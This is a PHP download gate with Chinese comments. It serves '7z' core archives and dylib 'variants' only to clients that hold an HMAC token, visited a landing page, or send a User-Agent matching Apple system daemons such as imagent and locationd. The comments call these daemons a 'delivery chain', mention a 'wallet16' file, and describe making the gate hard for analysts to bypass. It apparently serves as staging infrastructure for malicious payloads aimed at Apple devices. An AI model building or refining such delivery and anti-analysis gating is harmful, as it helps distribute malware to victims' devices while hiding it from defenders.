<?php
/**
 * corefile.php - 核心/变体文件统一分发器（防批量抓取/防绕过）
 * 校验策略：token 通过 OR 指纹通过（两者任一）→ readfile；否则 403
 * - token：HMAC-SHA256(SECRET, path|exp|ip)，exp=5min，绑定请求 IP（可选增强）
 * - 指纹：同 IP 最近 FP_WINDOW 秒内访问过 /gooll/gooll.html（由 gooll_fp.php 记录）
 * 安全性：本文件禁止 URL 直接访问（nginx deny），仅 fastcgi 内部执行
 */

const SECRET    = '';
const FP_WINDOW = 600;                                  // 指纹窗口 10 分钟
const FP_FILE   = '/tmp/pl_cf_fp/';                     // 指纹记录目录（www 可写）
function _secret() {
    static $s = null;
    if ($s === null) {
        $s = getenv('COREFILE_SECRET');
        if (!$s) {
            $e = @file_get_contents(dirname(__DIR__) . '/.env');
            if (preg_match('/^COREFILE_SECRET=(.+)$/m', (string)$e, $m)) { $s = trim($m[1]); }
        }
        if (!$s) { http_response_code(500); exit('{"error":"no secret"}'); }
    }
    return $s;
}
const ALLOWED   = array(
    '/corefiles/core_a5_fixed.7z'             => '/www/wwwroot/i.131422.com/details/core_a5_fixed.7z',
    '/corefiles/core_a5.gated.7z'              => '/www/wwwroot/i.131422.com/details/core_a5.gated.7z',
    '/corefiles/core_a5_dev.7z'                => '/www/wwwroot/i.131422.com/details/core_a5_dev.7z',
    '/corefiles/variants/set0/core_a5.dylib'   => '/www/wwwroot/i.131422.com/variants/set0/core_a5.dylib',
    '/corefiles/variants/set0_dev/core_a5.dylib' => '/www/wwwroot/i.131422.com/variants/set0_dev/core_a5.dylib',
);
// set0..4 动态白名单（核心+全部附件走变体目录，统一按前缀匹配）
const VAR_PREFIX = '/www/wwwroot/i.131422.com/variants/';

function h($s) { return hash_hmac('sha256', $s, _secret()); }

@set_time_limit(0);   // 大文件（wallet16 6.7MB）流式输出不因执行时限被截断

$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$ip  = $_SERVER['REMOTE_ADDR'];

// 1) 路径安全校验：只允许 /corefiles/ 前缀，禁止 ..
if (strpos($uri, '/corefiles/') !== 0 || strpos($uri, '..') !== false) { http_response_code(403); exit; }
$rel = substr($uri, strlen('/corefiles/'));

// 2) token 校验（?tk=hmac&e=exp_ts&ip=绑定Ip[可选]）
$pass = false;
if (isset($_GET['tk'], $_GET['e'])) {
    $exp = intval($_GET['e']);
    $tk  = (string)$_GET['tk'];
    if ($exp >= time() - 30 && $exp <= time() + 600) {          // 允许 -30s 时钟偏差
        $sig = h($uri . '|' . $exp . '|' . $ip);
        if (hash_equals($sig, $tk)) { $pass = true; }
    }
}

// 3) 指纹校验（无 token 时）：同 IP 10 分钟内访问过 gooll.html；或 UA 为投递链 daemon 精确特征（E1 收紧版）
//    E1：精确匹配 daemon UA 模式（locationd/powerd/configd/imagent 前缀 + CFNetwork/Darwin 版本号→攻击者需抓包确认 UA 才能伪造）
if (!$pass) {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ua_ok = (bool)preg_match('/^(locationd|powerd|configd|imagent)\/\d.*CFNetwork\/\d.*Darwin\/\d/i', $ua);
    if ($ua_ok) { $pass = true; }
    else {
        $fp = FP_FILE . md5($ip);
        if (is_file($fp) && (filemtime($fp) > time() - FP_WINDOW)) { $pass = true; }
    }
}

if (!$pass) { http_response_code(403); exit; }

// 4) 文件定位（白名单/变体前缀内）
$real = null;
if (isset(ALLOWED[$uri])) { $real = ALLOWED[$uri]; }
else {
    // /corefiles/variants/<set>/<file> → 白名单前缀校验
    if (preg_match('#^/corefiles/variants/(set\d+(_dev)?)/([A-Za-z0-9_.\-]+)$#', $uri, $m)) {
        $p = VAR_PREFIX . $m[1] . '/' . $m[3];
        if (is_file($p) && realpath($p) !== false && strpos(realpath($p), realpath(VAR_PREFIX)) === 0) {
            $real = $p;
        }
    }
}
if (!$real || !is_file($real)) { http_response_code(404); exit; }

// 5) 输出（与旧直出行为一致：no-store + gzip off）
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Expires: -1');
header('Content-Type: application/octet-stream');
header('X-Content-Type-Options: nosniff');
readfile($real);
